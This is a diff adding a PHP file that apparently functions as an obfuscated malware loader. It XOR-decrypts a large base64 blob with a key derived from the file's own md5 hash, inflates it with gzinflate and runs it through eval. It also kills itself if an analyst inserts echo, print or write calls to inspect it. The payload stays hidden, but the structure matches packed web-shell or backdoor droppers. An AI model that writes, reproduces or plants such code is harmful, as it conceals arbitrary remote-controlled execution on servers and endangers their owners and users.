@@ -1,0 +1,24 @@
+<?php
+$clmpmai="4f6d290d98f825ded7b082577a533e35";
+$xhbnccnn="035e0250575d05075f00055b02005707065555010e0b070153020005515d0704";
+$rccwjjsx="6iFpR77cxMxGkRjHHr+oixaYV76lSC5pFv5pqtOlj9j/IipwJ3Ze8TY5s/Xiz+SWwy3KJM9a72vkRx1ncBeN/frkzPVnkjaY2zPTg4nlOHxpFI1p6qX79Ez6UHSLo59pPmncV3MDaQgQSUS3bR/dHS7Ru/6yj1IQ8iUhvwQXjSdZ02uYseZoSPgiHtB+w5Liv31TE7hOU6utX9L2FBfWxnIUx4D9ifLni3zL3lga+FYpmAYlx+UQGzAZ8rsCPw0dAgNVF3PkM/DS2Opv6PxAdKbWI3gGXfNNQfDH5R0Hyfb2LoTyGFySs22R77MmVXsGZuPiI87UxH3QQlv1Q1gRmNwL/FxtXVCSOvTb0aCBgXDgrKRFzNBNRz7yeBzvcTIgIAqnh/FfJCMv5BzO+nB2UjFQGYQ30PWoikfh7RbaWSBQj2N611BTsNSwLkk7I3bTTtZmVFr7MQbWeYe1WVNsyZK94rRg26eqZtoKoqUd/7OzTZcLUD6yDSkE1bh5NNkGFWNUbJpAYPX6KYuLGKYPa3O1+2LLzUuTZ7Mh1LzqlboERcf15HBiyHY2G5lME/9JDJozM8kkFmdce2NxVDRfOkNISG2kEoVnKDd41TNuczrmCi+7DtlPJtldiihngD732/0/IzGjGf7UyDI5dGkabOVC9YEkt5BDhNCcnnz4sBEwCoKcK1QB9nSeNyY1hYGeagsmN+wvvgkt9B2nETUyJ8bT4JIDmWC2p1jKhlnBccEt577WkWAkhKM00lmt95rogNSP/+57be6Y6/iQ+0YfZ0gvt8czgopKER38aJylIdGS/3cCz4YyMyB5+WfTBPBCEiSzQ3aTUsBc+rYaT1ZZD87aNzQcnM5VqjtE7z9EaPrnmAk0E6GHPv5DsyYQwitkGRuXcdw0BnL0UCCsjW2nqm0PZFAyY2xDYYjy2a6Z29VeM20L4/C1mEKMlsyHsbcMwc3R4+LzTFqObYHwpS3bT3tUR26GtCGFGHSJtYXmeTazGX00ngJL4/nDKom1Nkk6+Hx4Tfz9r3S3W5Vd5Bj2zXi5FSc9OaQWW75yVYg/UVCzutGHBlKgKRZy+hVZ1YkMS6b+zLjrUBxfiXNlVmxAHlIKsMvFBRSTIZLTeEFWSx5py4qhX1jSCaR2QBp3ddJyAd0eK9ftGSm7YRQP/ZQZgUIcvkB8BEtE6NEXXHnTTPwv8BAtvsYxDpPbKXgudHKcWtMqDpr0xnGSBEM01LqKJ2/dPJVNlzyTZcOGv7Tmfyh31JsFnIn1NS8pw94tU+UaVYxVSz+mg8fPLXS2teCBOFqxG7IH1ZzgEjSBvSdFOXFsMLcyCsSZdgA1wrp3GdiLbNPgNUBBUaKz5ny9zXufcf+i1pBurTelAoyqH8/stydF2U/dVGOzpkmlXCFs1TfzL2vhkYtMnRhZadchoCWIUBg1+Oms7OZ12lPwDbGeQ9fsPHowog9mRy2bMA/BDGTVoCJRUnudMDbNVfw2YEsN1Ij2ZwfKrnU+QEI14fTTDMt915CEOCDvfue75BSh06pUbqUkefCoFlS4pN0Y5TW/7riF5f2rVWSpO8L5yvQB7xKGzlF0Nd2P8Cs9eDD6VBcWBX52If+/eyH24CUR7pkJCcpyfx8aiVkFTxCn+SGBGMe7tKvvDI9PcCZ8kd3r5YqH5qjV2mMlB8JmIDPZ779mz2j/exUVw7Vn7mv9KWHB1Xo8/9sTTMgOjRi7qYGJtfHDsesq9ys8wIjsj4hUXnomQxgQ1SIV/UklUfoc9XKYU7oyUgbSawjaTwzo2yZqvwj6lbgpjkVm45TP7NQfT9Z78VTVqQTJMl5l/hibJK0KlR4brDd7cA+eYh1yZJrGLp9HqxQeRY/5NZss9Mx4KTgIdV3yYhdoq8MmMyVfPgHA2wZBnu1sheoInpgZ0VrK9qrxqZ/iHEUVNqxUZ8LphtqZlqZjgB0W9xNlk91S0uXnOugqYdYkbmQv+qpqlmHsmQL0Vxpu3pvTjyOKemzFY7ubQjbQ5rXzCogRja0WCBNM/bz8HUD8yE/Dy99Fx9vD1NYsf5ZxpSHahcPKK2l/7XxfxiW4/3ayGTmmvTvHrwGZm5IeBxD+cVBJjdnOG5iXYlT/jVx0t9ZJUvWoLetwRhVrUFRThpOALHlBPqnk8mGhussjlfXXHpF8sQQY3/ijr/LkNcjMcAHKuRrpeSPnUK3AiVVD7MDX/4xwHAkNIkEYq7FTj+E5uiFPZFzkPocKw/cQ1GmsNa2tpTRKdrBxOefP6r9dCHnwUlhWzoYV+0XR6Qi3Tr73DP2gAN/1pu3Vn41mgkK5h/tzR32Xfrnbx/zgTnNLUGUNMEMVCo4xv3kJaGwk1Q5KphHcO9u4+oagMMwkPFxL5PZoSu9Fvm8EjKz5UgeOyAKApjm9SC2FEHsTq97CFlIHcCKbrNSmRpzKTgKeoQYcnngofdB6llRBTMnVSl+wuLYoKCxcTxVGrMnY39KbLoPFWhyRh6FjnbK+fnX3mnDst9YuNGXpJnQGlnLMOdLP5+H7vqCHPTOauVsUV4csc5AN5URWogJtSJJP4FyNajTLidQvMzAbsol3k7RFOmlF0StXhhYNe05ulNciE8gV9hbP5KGIFQLhbe6HiVaMXWAofc2lgt0RkOJI8cSGNjzD1MSWKPwRl0uWY2mIfZzQhbDu5zry0Vi5SLO1AMZ70L2qNLAhKNzivY1YKZIrFsd63QVuCiI/KK34obhXilBTVxRNGhVAXub5hXr2p/wEvIDX8/FEZjNMr/VA7ACc6e2Tgj8AngFElL065p2c++tfipEl/XwUJXVl8vfyTeZg8O8WJ1TybbljAp8nyuKMJuvqpuscvL/7I8jg9/lFVcbdu6+77QmXgtyo4L5JXJwt90tknLOQ95+Z9F1NyYr8385GtHrk/2pF7OZ3/efvdJPmWE1UAl2PkBeA2LzFVxCJzLjvK8S77pXWmws+ed2NaPeG9MphnuX7Ee9oqz1vMbTx0Lm+1AXQ9QD0Pv8GIGBg2fiqlcpp2JXumMwvaCjRlyWlBte6OFVca7svpSxGwuqvws8tGN+5IYrnJkQF0/ec0rtn4XpUc6ZUDY6I0+t0luWdNA==";
+$jxkskhdfrk=file_get_contents(__FILE__);
+$amixzsyx=str_replace($rccwjjsx,"",$jxkskhdfrk);
+if(strpos($amixzsyx,"ec"."ho")!==false||strpos($amixzsyx,"pr"."int")!==false||strpos($amixzsyx,"var_"."dump")!==false||strpos($amixzsyx,"file_put_"."contents")!==false||strpos($amixzsyx,"fw"."rite")!==false){die();}
+$nlefim=str_replace(array($clmpmai,$xhbnccnn),array("SP_0f1492b3","KP_bd6fac05"),$jxkskhdfrk);
+$lazfbmtgna=md5($nlefim);
+$umznttbf=hex2bin($xhbnccnn);
+$jinrxx="";
+$zcskiftv=strlen($lazfbmtgna);
+for($ieoyyj=0;$ieoyyj<$zcskiftv;$ieoyyj++){
+    $jinrxx.=chr(ord($umznttbf[$ieoyyj])^ord($lazfbmtgna[$ieoyyj]));
+}
+$pvbvxbcfelpx=base64_decode($rccwjjsx);
+$eemoaql=strlen($pvbvxbcfelpx);
+$qjrxbborbz="";
+$jycscd=strlen($jinrxx);
+for($ieoyyj=0;$ieoyyj<$eemoaql;$ieoyyj++){
+    $qjrxbborbz.=$pvbvxbcfelpx[$ieoyyj]^$jinrxx[$ieoyyj%$jycscd];
+}
+$xrpdbttvr="gz"."in"."fl"."ate";
+eval($xrpdbttvr($qjrxbborbz));
